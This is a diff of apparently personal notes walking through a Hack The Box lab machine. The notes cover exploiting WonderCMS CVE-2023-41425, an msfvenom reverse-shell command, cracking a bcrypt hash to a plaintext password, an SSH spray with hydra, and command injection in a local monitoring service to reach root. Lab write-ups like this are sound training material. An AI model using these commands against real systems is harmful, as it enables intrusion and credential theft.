@@ -2,11 +2,10 @@
 tags:
   - Linux
   - HTB
-  - Season6
   - XSS
   - deserialization
 creation date: 2024-08-16T14:50:00
-CVEs: 10.129.13.15
+CVEs: CVE-2023-41425
 URL:
 ---
 ## Information Gathering
@@ -120,3 +119,110 @@ Basically he says keep looking at the website and it's code 😒
 So its running WonderCMS.... which has a few CVEs 💰
 
 https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413#file-cve-2023-41425-md
+
+HOLY FUCKING COW... WTF... LEARN TO READ.. AND DO WHAT IS SAYS... NOT EVERYTHING IS A VARIABLE 😂
+
+I seen this in the exploit ![[Pasted image 20240817210849.png]] and thought it meant I needed to discover the 'loginURL' alas i was wrong. That literally is the login url 🤣
+
+## Foothold
+Actual fucking POC that works
+https://github.com/insomnia-jacob/CVE-2023-41425
+![[Pasted image 20240817220745.png]]
+![[Pasted image 20240817220728.png]]
+
+
+## Get a better 🐚
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.64 LPORT=31337 -f ELF > shell
+
+files the other users own
+![[Pasted image 20240817222651.png]]
+
+### back to the beginning
+lets go back to the beginning, where we landed, and enumerate from there. usually there is something in the vasinity of where you land on a box and i probably overlooked it. also this shells sucks ass so when i try to do finds i'm unable to scroll up and see everything. i tried a meterpreter session but i crashed metasploit... 
+
+cat /var/www/sea/data/database.js
+![[Pasted image 20240817222910.png]]
+
+## cash money 💰💵
+we got a hashed password!
+```
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
+```
+
+bcrypt hashes are literally the devil
+ Because they have a "/" in them there is an added "\" when they are stored so they are interpreted correctly. what the actual fuck
+```
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
+```
+
+```
+hashcat -m 3200 hash ~/tools/rockyou.txt
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+```
+
+## Lateral Movement
+With that password i am now an admin on the site. i did try to password spray ssh but it got me now where. 
+`hydra -L user -P pass 10.129.13.71 ssh `
+
+sumbitch... look at that command up there! whats wrong with it?! oh thats rights, thats the wrong IP address motherfucker!!! I just wasted a whole bunch of time trying to get RCE from the website because of this. Eventually, after several failed attemts at a file upload attack I asked myself "what would getting a shell as an admin on the website actually get me" OH THATS RIGHT ABSOTULTY FUCK ALL!! I'M ALREADY ON THE BOX AS WWW-DATA WITH THE SITE RUNS ON THE BOX AS YOU STUPID FUCKING TWAT!!
+
+Anyway... after rerunning hydra with the CORRECT IP address I got a hit
+
+![[Pasted image 20240817230355.png]]
+
+LET'S GOOOOO!!!
+
+![[Pasted image 20240817230532.png]]
+
+## Linpeas
+![[Pasted image 20240817232459.png]]
+
+only amay and root have logged into this box
+**![[Pasted image 20240817232602.png]]
+
+i have been unable to enumerate the ports listed above so i'm trying proxychains...
+`proxychains nmap -sV -p34791,8080 localhost`
+![[Pasted image 20240818002212.png]]
+
+![[Pasted image 20240818002635.png]]
+
+`proxychains firefox-esr http://localhost:8080 `
+ amay:mychemicalromance
+![[Pasted image 20240818003502.png]]
+
+Inspect page > click analyze (any file) > right click POST request > Click Edit and Resend > edit to include the following body:
+![[Pasted image 20240818005642.png]]
+View Response:
+![[Pasted image 20240818005654.png]]
+So we're on the right track just need to try harder...
+
+first, we need to figure out what service this is
+```
+systemctl --type=service --state=running
+```
+
+![[Pasted image 20240818005604.png]]
+
+This looks awfully familiar
+`monitoring.service          loaded active running System Monitoring Developing`
+Note the description matches the title of our webpage
+
+could this be something:
+![[Pasted image 20240818010049.png]]
+
+we're getting closer
+
+![[Pasted image 20240818010850.png]]
+
+So using the method above (modifying POST requests) I'm able to see /etc/passwd and etc/shadow but for some reason cannot read the flags (user or root)
+can read:
+/root/.bashrc
+
+finally figured it out
+
+## Root RCE
+
+![[Pasted image 20240818021214.png]]
+![[Pasted image 20240818021232.png]]
+
+By putting the &analyze_log on a new line it allowed log_file to do what it needed and not get cut off by the analyze bullshit.
